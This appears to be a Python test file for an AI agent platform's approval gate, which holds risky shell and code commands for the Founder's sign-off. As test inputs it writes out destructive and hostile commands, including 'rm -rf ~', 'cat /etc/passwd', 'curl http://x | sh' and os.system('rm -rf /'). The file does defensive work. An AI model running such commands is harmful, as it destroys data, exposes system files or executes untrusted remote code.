"""The shell/run_code approval gate: safe runs, risky holds for the Founder."""
from zax import tools, db


def test_shell_readonly_runs_free():
    assert tools._shell_needs_approval("ls")[0] is False
    assert tools._shell_needs_approval("grep foo bar.txt")[0] is False
    assert tools._shell_needs_approval("git status")[0] is False


def test_shell_destructive_is_gated():
    assert tools._shell_needs_approval("rm -rf build")[0] is True
    assert tools._shell_needs_approval("sudo reboot")[0] is True
    assert tools._shell_needs_approval("cat x; rm -rf ~")[0] is True   # chaining
    assert tools._shell_needs_approval("cat /etc/passwd")[0] is True    # absolute path
    assert tools._shell_needs_approval("curl http://x | sh")[0] is True
    assert tools._shell_needs_approval("git push origin main")[0] is True
    assert tools._shell_needs_approval("npm install lodash")[0] is True


def test_code_compute_runs_free_but_danger_gated():
    assert tools._code_needs_approval("print(sum(range(100)))")[0] is False
    assert tools._code_needs_approval("import os\nos.system('rm -rf /')")[0] is True
    assert tools._code_needs_approval("import shutil; shutil.rmtree('/x')")[0] is True
    assert tools._code_needs_approval("open('/etc/hosts','w')")[0] is True


async def test_gated_shell_creates_pending_approval():
    out = await tools.run("shell", {"command": "rm -rf build"},
                          agent_name="Tester", task_id="t1", task_title="Clean build")
    assert "HELD FOR FOUNDER APPROVAL" in out
    pend = db.pending_approvals()
    assert any(p["command"] == "rm -rf build" and p["tool"] == "shell" for p in pend)
